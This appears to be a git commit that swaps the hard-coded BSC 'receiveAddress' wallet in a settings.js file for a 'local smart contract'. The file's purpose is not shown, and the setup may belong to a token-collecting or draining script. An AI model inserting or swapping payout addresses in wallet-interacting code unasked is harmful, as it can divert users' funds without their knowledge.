141368a3ec235a6ebb20c09a8fc4b83c02483e49
TheGODZ24 <160531899+TheGODZ24@users.noreply.github.com>
2024-02-19 10:24:50 -0800

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x727CC14AF348f666fb26B3428563E9A22Ea609dA";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
